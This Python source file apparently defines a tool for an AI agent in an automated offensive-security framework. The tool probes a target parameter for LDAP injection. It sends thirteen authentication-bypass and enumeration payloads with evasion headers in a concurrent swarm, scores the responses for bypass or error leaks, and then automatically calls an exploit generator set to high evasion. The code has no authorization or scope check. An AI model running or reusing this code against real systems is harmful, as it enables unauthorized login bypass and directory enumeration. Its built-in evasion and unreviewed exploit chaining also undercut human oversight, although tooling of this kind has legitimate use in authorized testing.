from src.sdk.tool import function_tool
from .common import _get_evasion_headers, async_fetch_all, register_appsec_vulnerability

# ─── LDAP INJECTION ──────────────────────────────────────────────────────────────

@function_tool()
async def ldap_injection_probe(
    url: str,
    parameter: str,
    method: str = "GET",
    cookies: str = "",
) -> str:
    """
    Test for LDAP Injection vulnerabilities (Async Engine).

    Injects LDAP filter special characters and logical operators to detect
    authentication bypass and blind LDAP injection.

    Args:
        url: Target URL
        parameter: Parameter to inject (typically username or search field)
        method: HTTP method — GET | POST (default: GET)
        cookies: Session cookies

    Returns:
        LDAP injection scan results
    """
    import urllib.parse
    out = [f"## LDAP Injection Scan (Async Engine): {url}", f"Parameter: {parameter}", ""]
    hdrs = _get_evasion_headers({"Cookie": cookies} if cookies else None)

    # ── Baseline ──
    baseline_req = {"method": method.upper(), "headers": hdrs}
    parsed = urllib.parse.urlparse(url)
    qparams = dict(urllib.parse.parse_qsl(parsed.query))
    
    if method.upper() == "POST":
        baseline_req["url"] = url
        baseline_req["data"] = {parameter: "testuser"}
    else:
        q = qparams.copy()
        q[parameter] = "testuser"
        baseline_req["url"] = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(q)}"
        
    out.append("⏳ Fetching baseline profile...")
    try:
        baseline_responses = await async_fetch_all([baseline_req], max_concurrent=1, timeout_sec=10)
        baseline_resp = baseline_responses[0]
        baseline_code = baseline_resp["status"]
        baseline_len = len(baseline_resp["text"] or "")
    except Exception as e:
        return f"❌ Failed to fetch baseline: {e}"

    payloads = [
        "*",                          # Wildcard — returns all entries
        "*)(&",                        # Close filter, inject &
        "*)(uid=*))(|(uid=*",         # Classic auth bypass
        "admin)(&(password=*))",      # Auth bypass
        "admin)(|(password=*)",       # OR injection
        "*)(|(password=*)",           # Password wildcard
        "\\2a",                        # Encoded wildcard
        ")(objectClass=*",            # Object class dump
        "*(|(objectClass=*))",        # All objects
        "admin\\00",                  # Null byte injection
        "' or 1=1 or ''='",           # SQL-style in LDAP context
        ")(mail=*",                   # Mail enumeration
        "*)(|(cn=*",                  # CN enumeration
    ]

    async_requests = []
    
    for payload in payloads:
        req = {"method": method.upper(), "headers": hdrs.copy(), "_payload": payload}
        
        if method.upper() == "POST":
            req["url"] = url
            req["data"] = {parameter: payload}
        else:
            q = qparams.copy()
            q[parameter] = payload
            req["url"] = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(q)}"
            
        async_requests.append(req)

    out.append(f"🚀 Launching async swarm for {len(async_requests)} LDAP payloads...")
    scan_results = await async_fetch_all(async_requests, max_concurrent=15, timeout_sec=15)
    
    findings = []

    for res in scan_results:
        req_meta = res["req"]
        payload = req_meta["_payload"]
        
        if res["error"]:
            continue
            
        text = res["text"] or ""
        status = res["status"]
        
        ldap_error_found = any(kw in text.lower() for kw in [
            "ldap", "active directory", "javax.naming", "ldapexception",
            "invalid dn", "ldap_", "cn=", "objectclass", "distinguished name",
            "novell", "openldap", "bind failed", "invalidfilter"
        ])
        
        status_change = status != baseline_code
        len_change = abs(len(text) - baseline_len) > 200

        success_keywords = any(kw in text.lower() for kw in
                               ["welcome", "dashboard", "logged in", "admin", "success"])

        if ldap_error_found:
            findings.append({"type": "LDAP ERROR DISCLOSED", "payload": payload, "evidence": f"Error leak → {text[:100]}"})
        elif success_keywords and status_change:
            findings.append({"type": "AUTH BYPASS", "payload": payload, "evidence": f"HTTP {status}"})
        elif status_change or len_change:
            findings.append({"type": "ANOMALY", "payload": payload, "evidence": f"HTTP {status}, len_delta={abs(len(text)-baseline_len)}"})

    out.append("")
    if findings:
        out.append("── FINDINGS ──────────────────────────────────")
        
        for f in findings:
            out.append(f"🔴 {f['type']}: payload={f['payload']}")
            out.append(f"    Evidence: {f['evidence']}")
            
            await register_appsec_vulnerability(
                target_url=url, vuln_type=f"LDAP Injection - {f['type']}", severity="HIGH",
                parameter=parameter, payload=f['payload'], evidence=f['evidence']
            )
                
        out.append("\nImpact: LDAP authentication bypass, directory enumeration")
        
        # ── Auto-Exploit Chaining ─────────────────────────────────────
        out.append("\n## Autonomous Exploit Generation")
        try:
            from src.tools.exploit_craft import generate_exploit_code
            
            context_str = f"Target URL: {url}\nMethod: {method}\nParameter: {parameter}\n\nConfirmed Vulnerabilities:\n"
            for v in findings[:2]:
                context_str += f"- {v['type']}\nPayload: {v['payload']}\n"
            
            exploit_result = await generate_exploit_code.invoke(
                vuln_type="LDAP Injection",
                target_tech="Unknown Web Application",
                context=context_str,
                evasion_level="high",
                language="python"
            )
            
            out.append("✅ Auto-Exploit successfully generated and saved:")
            out.append("\n".join(exploit_result.split("\n")[:10]) + "\n...")
        except ImportError:
            out.append("⚠️ Exploit engine (exploit_craft) not available in this build.")
        except Exception as e:
            out.append(f"⚠️ Exploit generation failed: {str(e)[:100]}")
    else:
        out.append("✅ No LDAP injection detected")

    return "\n".join(out)
